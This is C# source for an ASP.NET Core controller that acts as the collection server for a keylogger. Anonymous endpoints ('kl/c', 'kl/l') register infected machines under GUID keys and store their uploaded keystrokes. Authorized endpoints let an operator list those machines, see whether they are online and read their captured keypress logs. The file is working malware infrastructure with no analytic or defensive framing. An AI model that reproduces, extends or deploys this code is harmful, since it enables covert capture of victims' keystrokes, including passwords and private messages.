using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using Server.Server.Data;
using Server.Server.Domain;
using Server.Server.Models;

namespace Server.Server.Controllers
{
    [Authorize]
    //[ApiController]
    //[Route("[controller]")]
    public class KeyLoggerController : ControllerBase
    {
        private readonly ApplicationDbContext _dbContext;
        private readonly ILogger<WeatherForecastController> _logger;

        public KeyLoggerController(ApplicationDbContext dbContext, ILogger<WeatherForecastController> logger)
        {
            _dbContext = dbContext;
            _logger = logger;
        }

        [HttpGet("/KeyLogger/ListMachines")]
        public List<Shared.Machine> ListMachines()
        {
            var minDate = DateTime.UtcNow.AddMinutes(-10);
            return _dbContext.Machines.AsNoTracking().OrderBy(m => m.Name).Select(m => new Shared.Machine()
            {
                Id = m.Id,
                Key = m.Key,
                Name = m.Name,
                Description = m.Description,
                Logs = m.KeyPressSets.Count(s => s.KeyPresses.Any()),
                Online = m.KeyPressSets.Any(s => s.KeyPresses.Any(k => k.To >= minDate))
            }).ToList();
        }

        [HttpGet("/KeyLogger/Machine/{id}/Logs")]
        public IActionResult GetLogs([FromRoute] int id)
        {
            var machine = _dbContext.Machines.AsTracking().Include(m => m.KeyPressSets).ThenInclude(m => m.KeyPresses).FirstOrDefault(m => m.Id == id);
            if (machine == null)
                return NotFound();

            return Ok(machine.KeyPressSets
                .Where(s => s.KeyPresses.Any())
                .OrderByDescending(s => s.KeyPresses.Max(p => p.To))
                .Select(s => new Shared.KeyPressSet()
                {
                    Id = s.Id,
                    KeyPresses = s.KeyPresses.Select(k => new Shared.KeyPress
                    {
                        To = k.To,
                        From = k.From,
                        Code = k.Code,
                        Data = k.Data,
                        DataType = k.DataType
                    }).ToList()
                }).ToList());
        }

        [HttpGet("KeyLogger/Machine/{id}")]
        public IActionResult GetMachine([FromRoute] int id)
        {
            var machine = _dbContext.Machines.AsTracking().Include(m => m.KeyPressSets).ThenInclude(m => m.KeyPresses).FirstOrDefault(m => m.Id == id);
            if (machine == null)
                return NotFound();
            
            var minDate = DateTime.UtcNow.AddMinutes(-10);
            return Ok(new Shared.Machine()
            {
                Id = machine.Id,
                Key = machine.Key,
                Name = machine.Name,
                Description = machine.Description,
                Logs = machine.KeyPressSets.Count(s => s.KeyPresses.Any()),
                Online = machine.KeyPressSets.Any(s => s.KeyPresses.Any(k => k.To >= minDate))
            });
        }

        [HttpPost]
        public IActionResult SaveMachine(Machine machine)
        {
            var current = _dbContext.Machines.AsTracking().Include(m => m.KeyPressSets).ThenInclude(m => m.KeyPresses).FirstOrDefault(m => m.Id == machine.Id);
            if (current == null)
                return NotFound();

            current.Name = machine.Name;
            current.Description = machine.Description;

            _dbContext.Machines.Update(current);
            _dbContext.SaveChanges();

            return Ok(current);
        }

        [AllowAnonymous]
        [HttpPost("kl/c")]
        public IActionResult Connect([FromBody] LogRequest request)
        {
            if (string.IsNullOrWhiteSpace(request.Key) || !_dbContext.Machines.AsTracking().Any(m => m.Key.Equals(request.Key)))
                request.Key = CreateMachine().Key;

            return Ok(request.Key);
        }

        private Machine CreateMachine()
        {
            var guid = Guid.NewGuid().ToString("N");
            var machine = new Machine()
            {
                Key = guid,
                Name = guid,
                Description = $"Created on {DateTime.UtcNow.ToLongDateString()} UTC"
            };

            _dbContext.Machines.Add(machine);
            _dbContext.SaveChanges();

            return machine;
        }

        [AllowAnonymous]
        [HttpPost("kl/l")]
        public IActionResult Log([FromBody] LogRequest request)
        {
            var machine = _dbContext.Machines.AsTracking().FirstOrDefault(m => m.Key.Equals(request.Key));
            if (machine == null)
                machine = CreateMachine();

            var set = new KeyPressSet()
            {
                MachineId = machine.Id,
                KeyPresses = request.Keys.Select(k => new Domain.KeyPress()
                {
                    Code = k.Code,
                    From = k.From,
                    To = k.To,
                    DataType = k.DataType,
                    Data = k.Data
                }).ToList()
            };

            _dbContext.KeyPressSets.Add(set);
            _dbContext.SaveChanges();

            return Ok(machine.Key);
        }
    }
}